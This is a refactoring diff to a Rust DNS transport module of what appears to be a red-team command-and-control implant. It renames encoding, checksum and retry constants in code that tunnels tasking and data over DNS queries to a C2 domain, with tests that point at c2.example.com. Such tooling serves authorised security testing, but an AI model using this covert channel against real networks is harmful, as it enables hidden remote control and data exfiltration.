@@ -48,6 +48,50 @@ const CHUNK_TIMEOUT_SECS: u64 = 20;
 const MAX_DNS_PACKET_SIZE: usize = 4096; // Maximum DNS response size
 const DNS_QUERY_TIMEOUT_SECS: u64 = 5; // Timeout for individual DNS queries
 
+// DNS server configuration
+const DEFAULT_DNS_PORT: &str = "53";
+const FALLBACK_DNS_CLOUDFLARE: &str = "1.1.1.1";
+const FALLBACK_DNS_GOOGLE: &str = "8.8.8.8";
+
+// Base36 encoding math constants (for sequence and CRC encoding)
+const BASE36_RADIX: usize = 36;
+const BASE36_POW_2: usize = 1296; // 36^2
+const BASE36_POW_3: usize = 46656; // 36^3
+const BASE36_POW_4: usize = 1679616; // 36^4
+
+// CRC16-CCITT constants
+const CRC16_INIT: u16 = 0xFFFF;
+const CRC16_POLYNOMIAL: u16 = 0x1021;
+const CRC16_HIGH_BIT: u16 = 0x8000;
+const CRC16_LOW_BYTE_MASK: u16 = 0xFF;
+
+// DNS protocol constants
+const DNS_QUERY_FLAG_STANDARD: [u8; 2] = [0x01, 0x00];
+const DNS_COMPRESSION_PTR_MASK: u8 = 0xC0;
+const DNS_RCODE_MASK: u8 = 0x0F;
+
+// Retry and timing constants
+const MAX_MISSING_CHUNK_RETRIES: usize = 5;
+const MAX_CHUNKED_INDICATOR_FETCHES: usize = 10;
+const MISSING_CHUNK_DELAY_MS: u64 = 50;
+const BACKOFF_BASE_SECS: u64 = 1;
+const BACKOFF_RETRY_DELAY_SECS: u64 = 2;
+
+// Label size calculation constants
+const DNS_LABEL_OVERHEAD_DIVISOR: usize = 64;
+const DNS_LABEL_USABLE_RATIO: usize = 63;
+
+// Base32 encoding ratio (8 bits to 5 bits, so 8/5 expansion)
+const BASE32_ENCODE_NUMERATOR: usize = 8;
+const BASE32_ENCODE_DENOMINATOR: usize = 5;
+
+// Binary chunking indicator
+const BINARY_CHUNK_MAGIC: u8 = 0xFF;
+
+// URL parsing constants
+const URL_SCHEME_PREFIX: &str = "dns://";
+const SYSTEM_RESOLVER_WILDCARD: &str = "*";
+
 // gRPC method paths
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
 static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
@@ -95,7 +139,11 @@ fn build_resolver_array() -> Vec<String> {
 
             #[cfg(debug_assertions)]
             if !resolvers.is_empty() {
-                log::debug!("Found {} system DNS servers: {:?}", resolvers.len(), resolvers);
+                log::debug!(
+                    "Found {} system DNS servers: {:?}",
+                    resolvers.len(),
+                    resolvers
+                );
             } else {
                 log::debug!("System DNS config returned no servers");
             }
@@ -108,7 +156,10 @@ fn build_resolver_array() -> Vec<String> {
 
     // Always add fallback servers (Cloudflare and Google)
     // Add only if not already in the list
-    let fallbacks = vec!["1.1.1.1:53".to_string(), "8.8.8.8:53".to_string()];
+    let fallbacks = vec![
+        format!("{}:{}", FALLBACK_DNS_CLOUDFLARE, DEFAULT_DNS_PORT),
+        format!("{}:{}", FALLBACK_DNS_GOOGLE, DEFAULT_DNS_PORT),
+    ];
     for fallback in fallbacks {
         if !resolvers.contains(&fallback) {
             resolvers.push(fallback);
@@ -140,9 +191,9 @@ fn method_to_code(method: &str) -> String {
 /// Supports TXT, A, and AAAA record types with automatic fallback.
 #[derive(Debug, Clone)]
 pub struct DNS {
-    dns_server: Option<String>,     // Some(server) = use explicit server, None = use resolver array
-    dns_resolvers: Vec<String>,     // Array of resolvers (system + fallbacks) when dns_server is None
-    current_resolver_index: usize,  // Current index in dns_resolvers array
+    dns_server: Option<String>, // Some(server) = use explicit server, None = use resolver array
+    dns_resolvers: Vec<String>, // Array of resolvers (system + fallbacks) when dns_server is None
+    current_resolver_index: usize, // Current index in dns_resolvers array
     base_domain: String,
     socket: Option<std::sync::Arc<UdpSocket>>,
     preferred_record_type: u16, // User's preferred type (TXT/A/AAAA)
@@ -162,11 +213,13 @@ impl DNS {
         // If we have N chars, we need ceil(N/63) - 1 dots
         // To be safe, estimate: for every 63 chars, we lose 1 char to a dot
         // So effective available space is: total_available * 63 / 64
-        let effective_available = (total_available * 63) / 64;
+        let effective_available =
+            (total_available * DNS_LABEL_USABLE_RATIO) / DNS_LABEL_OVERHEAD_DIVISOR;
 
         // Base32 encoding: ((HEADER_SIZE + data) * 8 / 5) <= effective_available
         // Solve for data: data <= (effective_available * 5 / 8) - HEADER_SIZE
-        let max_raw_packet = (effective_available * 5) / 8;
+        let max_raw_packet =
+            (effective_available * BASE32_ENCODE_DENOMINATOR) / BASE32_ENCODE_NUMERATOR;
         max_raw_packet.saturating_sub(HEADER_SIZE)
     }
 
@@ -180,11 +233,11 @@ impl DNS {
 
     fn encode_seq(seq: usize) -> String {
         const BASE36: &[u8] = b"0123456789abcdefghijklmnopqrstuvwxyz";
-        let digit4 = (seq / 1679616) % 36; // 36^4
-        let digit3 = (seq / 46656) % 36; // 36^3
-        let digit2 = (seq / 1296) % 36; // 36^2
-        let digit1 = (seq / 36) % 36; // 36^1
-        let digit0 = seq % 36; // 36^0
+        let digit4 = (seq / BASE36_POW_4) % BASE36_RADIX;
+        let digit3 = (seq / BASE36_POW_3) % BASE36_RADIX;
+        let digit2 = (seq / BASE36_POW_2) % BASE36_RADIX;
+        let digit1 = (seq / BASE36_RADIX) % BASE36_RADIX;
+        let digit0 = seq % BASE36_RADIX;
         format!(
             "{}{}{}{}{}",
             BASE36[digit4] as char,
@@ -212,21 +265,21 @@ impl DNS {
             }
         };
 
-        Ok(val(chars[0])? * 1679616
-            + val(chars[1])? * 46656
-            + val(chars[2])? * 1296
-            + val(chars[3])? * 36
+        Ok(val(chars[0])? * BASE36_POW_4
+            + val(chars[1])? * BASE36_POW_3
+            + val(chars[2])? * BASE36_POW_2
+            + val(chars[3])? * BASE36_RADIX
             + val(chars[4])?)
     }
 
-    /// Calculate CRC16-CCITT checksum (polynomial 0x1021, init 0xFFFF)
+    /// Calculate CRC16-CCITT checksum
     fn calculate_crc16(data: &[u8]) -> u16 {
-        let mut crc: u16 = 0xFFFF;
+        let mut crc: u16 = CRC16_INIT;
         for byte in data {
             crc ^= (*byte as u16) << 8;
             for _ in 0..8 {
-                if (crc & 0x8000) != 0 {
-                    crc = (crc << 1) ^ 0x1021;
+                if (crc & CRC16_HIGH_BIT) != 0 {
+                    crc = (crc << 1) ^ CRC16_POLYNOMIAL;
                 } else {
                     crc <<= 1;
                 }
@@ -239,10 +292,10 @@ impl DNS {
     fn encode_base36_crc(crc: u16) -> String {
         const BASE36: &[u8] = b"0123456789abcdefghijklmnopqrstuvwxyz";
         let crc_val = crc as usize;
-        let digit3 = (crc_val / 46656) % 36; // 36^3
-        let digit2 = (crc_val / 1296) % 36; // 36^2
-        let digit1 = (crc_val / 36) % 36; // 36^1
-        let digit0 = crc_val % 36; // 36^0
+        let digit3 = (crc_val / BASE36_POW_3) % BASE36_RADIX;
+        let digit2 = (crc_val / BASE36_POW_2) % BASE36_RADIX;
+        let digit1 = (crc_val / BASE36_RADIX) % BASE36_RADIX;
+        let digit0 = crc_val % BASE36_RADIX;
         format!(
             "{}{}{}{}",
             BASE36[digit3] as char,
@@ -270,8 +323,10 @@ impl DNS {
             }
         };
 
-        let crc =
-            val(chars[0])? * 46656 + val(chars[1])? * 1296 + val(chars[2])? * 36 + val(chars[3])?;
+        let crc = val(chars[0])? * BASE36_POW_3
+            + val(chars[1])? * BASE36_POW_2
+            + val(chars[2])? * BASE36_RADIX
+            + val(chars[3])?;
         Ok(crc as u16)
     }
 
@@ -354,7 +409,7 @@ impl DNS {
 
         // DNS Header (12 bytes)
         query.extend_from_slice(&transaction_id.to_be_bytes()); // Transaction ID
-        query.extend_from_slice(&[0x01, 0x00]); // Flags: Standard query
+        query.extend_from_slice(&DNS_QUERY_FLAG_STANDARD); // Flags: Standard query
         query.extend_from_slice(&[0x00, 0x01]); // Questions: 1
         query.extend_from_slice(&[0x00, 0x00]); // Answer RRs: 0
         query.extend_from_slice(&[0x00, 0x00]); // Authority RRs: 0
@@ -417,7 +472,7 @@ impl DNS {
                 if b == 0 {
                     offset += 1;
                     break;
-                } else if (b & 0xC0) == 0xC0 {
+                } else if (b & DNS_COMPRESSION_PTR_MASK) == DNS_COMPRESSION_PTR_MASK {
                     // Pointer
                     offset += 2;
                     break;
@@ -552,7 +607,8 @@ impl DNS {
                 }
 
                 // Receive response(s) until we get one with matching transaction ID
-                let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_secs(DNS_QUERY_TIMEOUT_SECS);
+                let deadline = tokio::time::Instant::now()
+                    + tokio::time::Duration::from_secs(DNS_QUERY_TIMEOUT_SECS);
                 let mut buf = [0u8; MAX_DNS_PACKET_SIZE];
                 let mut timed_out = false;
 
@@ -572,7 +628,7 @@ impl DNS {
                                 if response_id == transaction_id {
                                     // Check for DNS error (RCODE in flags)
                                     if len >= 4 {
-                                        let rcode = buf[3] & 0x0F; // Last 4 bits of flags
+                                        let rcode = buf[3] & DNS_RCODE_MASK; // Last 4 bits of flags
                                         if rcode != 0 {
                                             // DNS error response - try next resolver
                                             #[cfg(debug_assertions)]
@@ -648,9 +704,7 @@ impl DNS {
         }
 
         // All record types and resolvers failed
-        Err(anyhow::anyhow!(
-            "All DNS record types and resolvers failed"
-        ))
+        Err(anyhow::anyhow!("All DNS record types and resolvers failed"))
     }
 
     /// Send init packet and receive conversation ID from server
@@ -700,8 +754,8 @@ impl DNS {
             .await
             {
                 Ok(Ok(response)) if !response.is_empty() => {
-                    // Check if response is binary chunked indicator (magic byte 0xFF)
-                    if response.len() >= 4 && response[0] == 0xFF {
+                    // Check if response is binary chunked indicator
+                    if response.len() >= 4 && response[0] == BINARY_CHUNK_MAGIC {
                         // Binary chunked indicator format (for A records):
                         // Byte 0: 0xFF (magic)
                         // Bytes 1-2: chunk count (uint16 big-endian)
@@ -754,8 +808,8 @@ impl DNS {
                             let mut full_indicator = response_str.clone();
                             let mut fetch_seq = 0;
 
-                            // Try up to 10 fetches to get the full indicator
-                            while fetch_seq < 10 {
+                            // Try up to MAX_CHUNKED_INDICATOR_FETCHES to get the full indicator
+                            while fetch_seq < MAX_CHUNKED_INDICATOR_FETCHES {
                                 let subdomain =
                                     self.build_packet(TYPE_FETCH, fetch_seq, &temp_conv_id, &[])?;
                                 match self.send_query(&subdomain).await {
@@ -871,7 +925,7 @@ impl DNS {
             }
 
             if attempt < MAX_RETRIES - 1 {
-                let delay = 1 << attempt; // Exponential backoff: 1s, 2s, 4s, 8s, 16s
+                let delay = BACKOFF_BASE_SECS << attempt; // Exponential backoff: 1s, 2s, 4s, 8s, 16s
                 #[cfg(debug_assertions)]
                 log::debug!("Waiting {}s before retry...", delay);
                 tokio::time::sleep(tokio::time::Duration::from_secs(delay)).await;
@@ -932,7 +986,10 @@ impl DNS {
                 }
                 _ => {
                     if attempt < MAX_RETRIES - 1 {
-                        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+                        tokio::time::sleep(tokio::time::Duration::from_secs(
+                            BACKOFF_RETRY_DELAY_SECS,
+                        ))
+                        .await;
                     }
                 }
             }
@@ -952,10 +1009,8 @@ impl DNS {
         chunks: &[Vec<u8>],
         retry_count: usize,
     ) -> Result<Vec<u8>> {
-        const MAX_MISSING_CHUNK_RETRIES: usize = 5;
-
-        // Check if response is binary chunked indicator (magic byte 0xFF)
-        if response.len() >= 4 && response[0] == 0xFF {
+        // Check if response is binary chunked indicator
+        if response.len() >= 4 && response[0] == BINARY_CHUNK_MAGIC {
             // Binary chunked indicator format (for A records):
             // Byte 0: 0xFF (magic)
             // Bytes 1-2: chunk count (uint16 big-endian)
@@ -1027,7 +1082,7 @@ impl DNS {
             }
 
             // Small delay to let resent chunks arrive before sending end packet again
-            tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
+            tokio::time::sleep(tokio::time::Duration::from_millis(MISSING_CHUNK_DELAY_MS)).await;
 
             // Retry end packet
             let last_seq = chunks.len().saturating_sub(1);
@@ -1147,7 +1202,7 @@ impl DNS {
         let crc_match = if is_text_chunking {
             actual_crc == expected_crc
         } else {
-            (actual_crc & 0xFF) == (expected_crc & 0xFF)
+            (actual_crc & CRC16_LOW_BYTE_MASK) == (expected_crc & CRC16_LOW_BYTE_MASK)
         };
 
         if !crc_match {
@@ -1262,7 +1317,7 @@ impl Transport for DNS {
         //   dns://8.8.8.8/c2.example.com          - Specific server, TXT with fallback
         //   dns://*/c2.example.com?type=A         - System resolver, prefer A records
         //   dns://*/c2.example.com?fallback=false - TXT only, no fallback
-        let url = callback.trim_start_matches("dns://");
+        let url = callback.trim_start_matches(URL_SCHEME_PREFIX);
 
         // Split URL and query params
         let (server_domain, query_params) = if let Some(idx) = url.find('?') {
@@ -1279,13 +1334,13 @@ impl Transport for DNS {
             ));
         }
 
-        let dns_server = if parts[0] == "*" {
+        let dns_server = if parts[0] == SYSTEM_RESOLVER_WILDCARD {
             // Use system resolver
             None
         } else if parts[0].contains(':') {
             Some(parts[0].to_string())
         } else {
-            Some(format!("{}:53", parts[0]))
+            Some(format!("{}:{}", parts[0], DEFAULT_DNS_PORT))
         };
 
         let base_domain = parts[1].to_string();
@@ -1433,10 +1488,11 @@ impl Transport for DNS {
         // This is necessary because iterating over the sync receiver would block the async task
         let handle = tokio::spawn(async move {
             let mut all_chunks = Vec::new();
-            #[cfg_attr(not(debug_assertions), allow(unused_variables))]
-            let mut chunk_count = 0;
 
             // Iterate over the sync channel receiver in a spawned task to avoid blocking
+            #[cfg(debug_assertions)]
+            let mut chunk_count = 0;
+
             for chunk in request {
                 #[cfg(debug_assertions)]
                 {
@@ -1725,18 +1781,33 @@ mod tests {
     fn test_dns_new_with_wildcard_builds_resolver_array() {
         let dns = DNS::new("dns://*/c2.example.com".to_string(), None).unwrap();
 
-        assert!(dns.dns_server.is_none(), "dns_server should be None for wildcard");
-        assert!(!dns.dns_resolvers.is_empty(), "dns_resolvers array should be populated");
+        assert!(
+            dns.dns_server.is_none(),
+            "dns_server should be None for wildcard"
+        );
+        assert!(
+            !dns.dns_resolvers.is_empty(),
+            "dns_resolvers array should be populated"
+        );
 
         // Should always have at least Cloudflare and Google fallbacks
-        assert!(dns.dns_resolvers.len() >= 2, "Should have at least 2 resolvers (fallbacks)");
+        assert!(
+            dns.dns_resolvers.len() >= 2,
+            "Should have at least 2 resolvers (fallbacks)"
+        );
 
         // Check that Cloudflare and Google are in the list (they should be at the end)
         let has_cloudflare = dns.dns_resolvers.iter().any(|s| s == "1.1.1.1:53");
         let has_google = dns.dns_resolvers.iter().any(|s| s == "8.8.8.8:53");
 
-        assert!(has_cloudflare, "Should have Cloudflare (1.1.1.1:53) in resolver list");
-        assert!(has_google, "Should have Google (8.8.8.8:53) in resolver list");
+        assert!(
+            has_cloudflare,
+            "Should have Cloudflare (1.1.1.1:53) in resolver list"
+        );
+        assert!(
+            has_google,
+            "Should have Google (8.8.8.8:53) in resolver list"
+        );
 
         assert_eq!(dns.current_resolver_index, 0, "Should start at index 0");
 
@@ -1749,6 +1820,9 @@ mod tests {
         let dns = DNS::new("dns://8.8.8.8/c2.example.com".to_string(), None).unwrap();
 
         assert_eq!(dns.dns_server, Some("8.8.8.8:53".to_string()));
-        assert!(dns.dns_resolvers.is_empty(), "dns_resolvers should be empty with explicit server");
+        assert!(
+            dns.dns_resolvers.is_empty(),
+            "dns_resolvers should be empty with explicit server"
+        );
     }
 }
